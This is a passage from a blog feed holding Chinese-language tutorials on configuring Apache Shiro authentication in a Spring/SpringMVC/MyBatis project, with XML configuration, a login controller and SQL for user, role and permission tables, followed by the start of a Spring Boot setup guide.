&lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;      &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;      &lt;version&gt;4.1.6&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;log4j&lt;/groupId&gt;      &lt;artifactId&gt;log4j&lt;/artifactId&gt;      &lt;version&gt;1.2.17&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p> 将项目需要使用的包先导入，后期导入也没关系。但是springmvc，jdbc，shiro需要提前导入，方便修改web.xml文件。</p><h3 id="1-3修改web-xml"><a href="#1-3修改web-xml" class="headerlink" title="1.3修改web.xml"></a>1.3修改web.xml</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!--  Licensed to the Apache Software Foundation (ASF) under one or more  contributor license agreements.  See the NOTICE file distributed with  this work for additional information regarding copyright ownership.  The ASF licenses this file to You under the Apache License, Version 2.0  (the &quot;License&quot;); you may not use this file except in compliance with  the License.  You may obtain a copy of the License at      http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.--&gt;&lt;!--  - This is the Cocoon web-app configurations file  -  - $Id$  --&gt;&lt;web-app version=&quot;2.4&quot;         xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;&gt;  &lt;filter&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;encoding&lt;/param-name&gt;      &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;      &lt;param-value&gt;classpath:spring/spring-*.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><h3 id="1-4-创建spring-mvc-xml"><a href="#1-4-创建spring-mvc-xml" class="headerlink" title="1.4 创建spring-mvc.xml"></a>1.4 创建spring-mvc.xml</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd       http://www.springframework.org/schema/mvc       http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd&quot;&gt;    &lt;context:component-scan base-package=&quot;com.imgurl.controller&quot; /&gt;    &lt;mvc:annotation-driven /&gt;    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot; /&gt;        &lt;property name=&quot;filterChainDefinitions&quot;&gt;            &lt;value&gt;                /login=anon                /admin/**=authc            &lt;/value&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;        &lt;property name=&quot;prefix&quot; value=&quot;WEB-INF/views&quot; /&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><h3 id="1-5创建spring-shiro-xml"><a href="#1-5创建spring-shiro-xml" class="headerlink" title="1.5创建spring-shiro.xml"></a>1.5创建spring-shiro.xml</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:util=&quot;http://www.springframework.org/schema/util&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;    &lt;!-- Shiro的Web过滤器 --&gt;    &lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;        &lt;!-- Shiro的安全管理器，所有关于安全的操作都会经过SecurityManager --&gt;        &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;        &lt;!-- 系统认证提交地址，如果用户退出即session丢失就会访问这个页面 --&gt;        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;        &lt;!-- 权限验证失败跳转的页面，需要配合Spring的ExceptionHandler异常处理机制使用 --&gt;        &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt;        &lt;property name=&quot;filters&quot;&gt;            &lt;util:map&gt;                &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt;            &lt;/util:map&gt;        &lt;/property&gt;        &lt;!-- 自定义的过滤器链，从上向下执行，一般将`/**`放到最下面 --&gt;        &lt;property name=&quot;filterChainDefinitions&quot;&gt;            &lt;value&gt;                &lt;!-- 静态资源不拦截 --&gt;                /static/** = anon                /lib/** = anon                /js/** = anon                &lt;!-- 登录页面不拦截 --&gt;                /login.jsp = anon                /login.do = anon                &lt;!-- Shiro提供了退出登录的配置`logout`，会生成路径为`/logout`的请求地址，访问这个地址即会退出当前账户并清空缓存 --&gt;                /logout = logout                &lt;!-- user表示身份通过或通过记住我通过的用户都能访问系统 --&gt;                /index.jsp = user                &lt;!-- `/**`表示所有请求，表示访问该地址的用户是身份验证通过或RememberMe登录的都可以 --&gt;                /** = user            &lt;/value&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;!-- 基于Form表单的身份验证过滤器 --&gt;    &lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt;        &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt;        &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt;        &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 安全管理器 --&gt;    &lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;        &lt;property name=&quot;realm&quot; ref=&quot;userRealm&quot; /&gt;    &lt;/bean&gt;    &lt;!-- Realm实现 --&gt;    &lt;bean id=&quot;userRealm&quot; class=&quot;com.imgurl.realm.UserRealm&quot;&gt;&lt;/bean&gt;&lt;/beans&gt;</code></pre><h3 id="1-6创建UserRealm实例"><a href="#1-6创建UserRealm实例" class="headerlink" title="1.6创建UserRealm实例"></a>1.6创建UserRealm实例</h3><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSM框架整合のShiro</title>
      <link href="/2019/04/29/ssm-kuang-jia-zheng-he-noshiro/"/>
      <url>/2019/04/29/ssm-kuang-jia-zheng-he-noshiro/</url>
      
        <content type="html"><![CDATA[<h1 id="SSM框架整合のShiro"><a href="#SSM框架整合のShiro" class="headerlink" title="SSM框架整合のShiro"></a>SSM框架整合のShiro</h1><blockquote><p> 前面我们学习了如何使用IDEA+Maven创建SSM框架，配置拦截器等。当你的项目越来越大，对不同的用户就有不同的权限，这样我们就不只是局限于系统去判定他是否登录了。</p></blockquote><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><blockquote><p> 已经利用Maven创建好SSM框架<a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a>。数据相关内容请查看<a href="https://kalifun.top/archives/200" target="_blank" rel="noopener">Shiroの表结构设计</a></p></blockquote><h2 id="1-导入jar包"><a href="#1-导入jar包" class="headerlink" title="1.导入jar包"></a>1.导入jar包</h2><pre><code>&lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-ehcache --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-quartz --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-quartz&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-web --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>将上面的贴到pom.xml中。当你使用其他版本时需要注意关联。尽可能版本相同。</p><h2 id="2-整合Shiro"><a href="#2-整合Shiro" class="headerlink" title="2.整合Shiro"></a>2.整合Shiro</h2><h3 id="2-1-配置过滤器"><a href="#2-1-配置过滤器" class="headerlink" title="2.1 配置过滤器"></a>2.1 配置过滤器</h3><blockquote><h4 id="修改web-xml文件"><a href="#修改web-xml文件" class="headerlink" title="修改web.xml文件"></a>修改web.xml文件</h4><pre><code>&lt;filter&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;      &lt;param-value&gt;true&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;</code></pre><p> 你会发现和我们配置SpringMVC的EncodingFilter很像。DelegatingFilterProxy会自动到Spring容器中name为shiroFilter的bean，并且将所有Filter的操作都委托给他管理。</p></blockquote><h3 id="2-2配置Bean"><a href="#2-2配置Bean" class="headerlink" title="2.2配置Bean"></a>2.2配置Bean</h3><blockquote><p> 创建spring-shiro.xml文件</p><pre><code>&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;&lt;/bean&gt;</code></pre><p> 需要注意这里的id需要和我们在web.xml中创建的过滤器名称相同否则无效。看过我<a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a>这个文章的就知道，因为在web.xml设置名称为spring-*.xml。会自己去扫描文件前缀后缀匹配的。</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:util=&quot;http://www.springframework.org/schema/util&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;</code></pre></blockquote><pre><code>&lt;!-- Shiro的Web过滤器 --&gt;&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;    &lt;!-- Shiro的安全管理器，所有关于安全的操作都会经过SecurityManager --&gt;    &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;    &lt;!-- 系统认证提交地址，如果用户退出即session丢失就会访问这个页面 --&gt;    &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;    &lt;!-- 权限验证失败跳转的页面，需要配合Spring的ExceptionHandler异常处理机制使用 --&gt;    &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt;    &lt;property name=&quot;filters&quot;&gt;        &lt;util:map&gt;            &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt;        &lt;/util:map&gt;    &lt;/property&gt;    &lt;!-- 自定义的过滤器链，从上向下执行，一般将`/**`放到最下面 --&gt;    &lt;property name=&quot;filterChainDefinitions&quot;&gt;        &lt;value&gt;            &lt;!-- 静态资源不拦截 --&gt;            /static/** = anon            /lib/** = anon            /js/** = anon            &lt;!-- 登录页面不拦截 --&gt;            /login.jsp = anon            /login.do = anon            &lt;!-- Shiro提供了退出登录的配置`logout`，会生成路径为`/logout`的请求地址，访问这个地址即会退出当前账户并清空缓存 --&gt;            /logout = logout            &lt;!-- user表示身份通过或通过记住我通过的用户都能访问系统 --&gt;            /index.jsp = user            &lt;!-- `/**`表示所有请求，表示访问该地址的用户是身份验证通过或RememberMe登录的都可以 --&gt;            /** = user        &lt;/value&gt;    &lt;/property&gt;&lt;/bean&gt;&lt;!-- 基于Form表单的身份验证过滤器 --&gt;&lt;bean id=&quot;formAuthenticationFilter&quot; class=&quot;org.apache.shiro.web.filter.authc.FormAuthenticationFilter&quot;&gt;    &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt;    &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt;    &lt;property name=&quot;loginUrl&quot; value=&quot;/login.jsp&quot;/&gt;&lt;/bean&gt;&lt;!-- 安全管理器 --&gt;&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;    &lt;property name=&quot;realm&quot; ref=&quot;userRealm&quot;/&gt;&lt;/bean&gt;&lt;!-- Realm实现 --&gt;&lt;bean id=&quot;userRealm&quot; class=&quot;xx.xxxxx.xxxxx.UserRealm&quot;&gt;&lt;/bean&gt;</code></pre> ```>  Realm：域，Shiro 从从Realm获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色/权限进行验证用户是否能进行操作；可以把Realm看成DataSource ， 即安全数据源。 上面配置类似于我们使用的mvc:interceptors一样。对需要过滤的进行设置，对不过滤的放入安全管理器进行管理。我们利用创建UserRealm实例来实现自定义的数据管理。## 3.Shiro实现身份认证### 3.1身份认证流程>  一般后台登录我们需要提交的表单是username,password。不排除于利用邮箱登录的。根据后台登录页面提交的字段来针对form表单的身份验证过滤器进行修改（formAuthenticationFilter）。-  用户输入这两个用户名和密码后提交表单，通过绑定了SecurityManager的SecurityUtils得到Subject实例，然后获取身份验证的UsernamePasswordToken传入用户名和密码。-   调用subject.login(token)进行登录，SecurityManager会委托Authenticator把相应的token传给Realm，从Realm中获取身份认证信息。-  Realm可以是自己实现的Realm，Realm会根据传入的用户名和密码去数据库进行校验（提供Service层登录接口）。-  Shiro从Realm中获取安全数据（如用户、身份、权限等），如果校验失败，就会抛出异常，登录失败；否则就登录成功。```@Controllerpublic class LoginController {    @RequestMapping("/login")    public String login(            @RequestParam(value = "username", required = false) String username,            @RequestParam(value = "password", required = false) String password,            Model model) {        String error = null;        if (username != null && password != null) {            //初始化            Subject subject = SecurityUtils.getSubject();            UsernamePasswordToken token = new UsernamePasswordToken(username, password);            try {                //登录，即身份校验，由通过Spring注入的UserRealm会自动校验输入的用户名和密码在数据库中是否有对应的值                subject.login(token);                return "redirect:index.do";            }catch (Exception e){                e.printStackTrace();                error = "未知错误，错误信息：" + e.getMessage();            }        } else {            error = "请输入用户名和密码";        }        //登录失败，跳转到login页面，这里不做登录成功的处理，由        model.addAttribute("error", error);        return "login";    }}``` 上面是一个login的controller。从前端获得获得字段为username,password。然后进行判断。 当前端没有输入账号或者密码直接error，然后跳转到login。 若两个字段都输入了的话。subject.login(token)进行登录，随后就是通过Realm进行登录校验，如果登录失败就可能抛出一系列异常，比如UnknownAccountException用户账户不存在异常、IncorrectCredentialsException用户名或密码错误异常、LockedAccountException账户锁定异常… 。]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroの表结构设计</title>
      <link href="/2019/04/29/shironobiao-jie-gou-she-ji/"/>
      <url>/2019/04/29/shironobiao-jie-gou-she-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroの表结构设计"><a href="#Shiroの表结构设计" class="headerlink" title="Shiroの表结构设计"></a>Shiroの表结构设计</h1><blockquote><p>  通常我们的权限设计都是 用户–角色–权限 ,其中角色是我们写代码的人没法控制的,它可以有多条权限,每个用户又可以设计为拥有多个角色.因此如果从角色着手进行权限验证,系统都必须根据用户的配置动起来,非常复杂.角色的作用其实只是用来管理分配权限的,真正的验证只验证权限。</p></blockquote><h2 id="1-表设计"><a href="#1-表设计" class="headerlink" title="1.表设计"></a>1.表设计</h2><h3 id="1-1数据库结构"><a href="#1-1数据库结构" class="headerlink" title="1.1数据库结构"></a>1.1数据库结构</h3><p> -users 用户表<br> -roles 角色表<br> -permissions 权限表<br> -users_roles 用户角色关联表<br> -roles_permissions 角色权限关联表</p><h2 id="2-创建表"><a href="#2-创建表" class="headerlink" title="2.创建表"></a>2.创建表</h2><h3 id="2-1users表"><a href="#2-1users表" class="headerlink" title="2.1users表"></a>2.1users表</h3><p><img src="https://image.kalifun.top/upload/1904/524f7a79cf3bcbae.png" alt="![524f7a79cf3bcbae.png](https://image.kalifun.top/upload/1904/524f7a79cf3bcbae.png)"><br>可能最关心的就是locked这个字段吧，它的类型为TINYINT。这个值只能是0、1.当我们使用mybatis时，获得这个类型的数据是0时会转为false。</p><h3 id="2-2roles表"><a href="#2-2roles表" class="headerlink" title="2.2roles表"></a>2.2roles表</h3><p><img src="https://image.kalifun.top/upload/1904/b3fcda6dc4900f46.png" alt="![b3fcda6dc4900f46.png](https://image.kalifun.top/upload/1904/b3fcda6dc4900f46.png)"><br>pid表示父节点，就是说，当前的角色可能有上级节点，比如老师，这个角色可能就有父节点计科教师，如果存在父节点，这个字段值就是父级节点的ID，根据这个ID，在展示数据的时候就很方便的展示出其在哪个父节点下。</p><h3 id="2-3users-roles表格"><a href="#2-3users-roles表格" class="headerlink" title="2.3users_roles表格"></a>2.3users_roles表格</h3><p><img src="https://image.kalifun.top/upload/1904/48955f65b0730ad9.png" alt="![48955f65b0730ad9.png](https://image.kalifun.top/upload/1904/48955f65b0730ad9.png)"><br> 这张表主要描述指定用户与角色间的依赖关系。</p><h3 id="2-4permissions表"><a href="#2-4permissions表" class="headerlink" title="2.4permissions表"></a>2.4permissions表</h3><p><img src="https://image.kalifun.top/upload/1904/f01be9f000a1a985.png" alt="![f01be9f000a1a985.png](https://image.kalifun.top/upload/1904/f01be9f000a1a985.png)"></p><h3 id="2-5roles-permissions表"><a href="#2-5roles-permissions表" class="headerlink" title="2.5roles_permissions表"></a>2.5roles_permissions表</h3><p><img src="https://image.kalifun.top/upload/1904/527412228ce38f2c.png" alt="![527412228ce38f2c.png](https://image.kalifun.top/upload/1904/527412228ce38f2c.png)"><br>主要描述角色和权限间的依赖关系</p><h2 id="3-创建源码"><a href="#3-创建源码" class="headerlink" title="3.创建源码"></a>3.创建源码</h2><pre><code>-- ---------------------------------------------------------- 主机:                           127.0.0.1-- 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution-- 服务器操作系统:                      Win64-- HeidiSQL 版本:                  9.4.0.5125-- --------------------------------------------------------/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;/*!40101 SET NAMES utf8 */;/*!50503 SET NAMES utf8mb4 */;/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;-- 导出 imgurl 的数据库结构CREATE DATABASE IF NOT EXISTS `imgurl` /*!40100 DEFAULT CHARACTER SET latin1 */;USE `imgurl`;-- 导出  表 imgurl.permissions 结构CREATE TABLE IF NOT EXISTS `permissions` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `permission` int(11) NOT NULL DEFAULT 0 COMMENT &#39;权限编号&#39;,  `description` int(11) NOT NULL DEFAULT 0 COMMENT &#39;权限描述&#39;,  `rid` int(11) NOT NULL DEFAULT 0 COMMENT &#39;权限关联角色&#39;,  `available` int(11) NOT NULL DEFAULT 0 COMMENT &#39;是否锁定&#39;,  PRIMARY KEY (`id`),  UNIQUE KEY `users_roles_permission` (`permission`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;-- 数据导出被取消选择。-- 导出  表 imgurl.roles 结构CREATE TABLE IF NOT EXISTS `roles` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `role` varchar(50) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;角色名称&#39;,  `description` varchar(150) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;角色描述&#39;,  `pid` int(11) NOT NULL DEFAULT 0 COMMENT &#39;父节点&#39;,  `available` tinyint(4) NOT NULL DEFAULT 0 COMMENT &#39;是否锁定&#39;,  PRIMARY KEY (`id`),  UNIQUE KEY `roles_role` (`role`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;-- 数据导出被取消选择。-- 导出  表 imgurl.roles_permissions 结构CREATE TABLE IF NOT EXISTS `roles_permissions` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `roles_id` int(11) DEFAULT 0 COMMENT &#39;角色编号&#39;,  `permissions_id` int(11) DEFAULT 0 COMMENT &#39;权限编号&#39;,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;-- 数据导出被取消选择。-- 导出  表 imgurl.users 结构CREATE TABLE IF NOT EXISTS `users` (  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;,  `username` varchar(50) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;用户名&#39;,  `password` varchar(50) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;密码&#39;,  `salt` varchar(50) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;盐值&#39;,  `role_id` varchar(50) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;角色id&#39;,  `locked` tinyint(1) NOT NULL DEFAULT 0 COMMENT &#39;锁定&#39;,  PRIMARY KEY (`id`),  UNIQUE KEY `users_username` (`username`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;-- 数据导出被取消选择。-- 导出  表 imgurl.users_roles 结构CREATE TABLE IF NOT EXISTS `users_roles` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `user_id` int(20) NOT NULL DEFAULT 0 COMMENT &#39;用户编号&#39;,  `role_id` int(20) NOT NULL DEFAULT 0 COMMENT &#39;角色编号&#39;,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;-- 数据导出被取消选择。/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, &#39;&#39;) */;/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot从入门到入门</title>
      <link href="/2019/04/29/spring-boot-cong-ru-men-dao-ru-men/"/>
      <url>/2019/04/29/spring-boot-cong-ru-men-dao-ru-men/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot从入门到入门"><a href="#Spring-Boot从入门到入门" class="headerlink" title="Spring Boot从入门到入门"></a>Spring Boot从入门到入门</h1><h2 id="什么是Spring-Boot"><a href="#什么是Spring-Boot" class="headerlink" title="什么是Spring Boot"></a>什么是Spring Boot</h2><blockquote><h4 id="Spring-Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。"><a href="#Spring-Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。" class="headerlink" title="Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。"></a>Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。</h4></blockquote><h2 id="Spring-Boot的优点"><a href="#Spring-Boot的优点" class="headerlink" title="Spring Boot的优点"></a>Spring Boot的优点</h2><ul><li><h3 id="自动配置：无需繁琐的去配置web-xml，spring-mvc-xml等"><a href="#自动配置：无需繁琐的去配置web-xml，spring-mvc-xml等" class="headerlink" title="自动配置：无需繁琐的去配置web.xml，spring-mvc.xml等"></a>自动配置：无需繁琐的去配置web.xml，spring-mvc.xml等</h3><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><h3 id="1-选择-Spring-Initializr"><a href="#1-选择-Spring-Initializr" class="headerlink" title="1.选择 Spring Initializr"></a>1.选择 Spring Initializr</h3><img src="https://image.kalifun.top/upload/1904/e98e4d34feff6ab4.png" alt="![e98e4d34feff6ab4.png](https://image.kalifun.top/upload/1904/e98e4d34feff6ab4.png)"><h3 id="2-设置项目信息"><a href="#2-设置项目信息" class="headerlink" title="2.设置项目信息"></a>2.设置项目信息</h3><img src="https://image.kalifun.top/upload/1904/e3600e2d4e78a533.png" alt="![e3600e2d4e78a533.png](https://image.kalifun.top/upload/1904/e3600e2d4e78a533.png)"><h3 id="3-选择WEB"><a href="#3-选择WEB" class="headerlink" title="3.选择WEB"></a>3.选择WEB</h3><img src="https://image.kalifun.top/upload/1904/3b30c3c7c9615614.png" alt="![3b30c3c7c9615614.png](https://image.kalifun.top/upload/1904/3b30c3c7c9615614.png)"><h3 id="4-确认存放路径"><a href="#4-确认存放路径" class="headerlink" title="4.确认存放路径"></a>4.确认存放路径</h3><img src="https://image.kalifun.top/upload/1904/41bdcb9c19891132.png" alt="![41bdcb9c19891132.png](https://image.kalifun.top/upload/1904/41bdcb9c19891132.png)"><h3 id="5-选择自动导入"><a href="#5-选择自动导入" class="headerlink" title="5.选择自动导入"></a>5.选择自动导入</h3><h4 id="当我们修改pom-xml时，它会自动导入包，所以建议选择自动导入。"><a href="#当我们修改pom-xml时，它会自动导入包，所以建议选择自动导入。" class="headerlink" title="当我们修改pom.xml时，它会自动导入包，所以建议选择自动导入。"></a>当我们修改pom.xml时，它会自动导入包，所以建议选择自动导入。</h4><img src="https://image.kalifun.top/upload/1904/56ad9edae31845d5.png" alt="![56ad9edae31845d5.png](https://image.kalifun.top/upload/1904/56ad9edae31845d5.png)"><h3 id="6-加载完毕"><a href="#6-加载完毕" class="headerlink" title="6.加载完毕"></a>6.加载完毕</h3><img src="https://image.kalifun.top/upload/1904/f4a64e176802e8f8.png" alt="![f4a64e176802e8f8.png](https://image.kalifun.top/upload/1904/f4a64e176802e8f8.png)"></li><li><h4 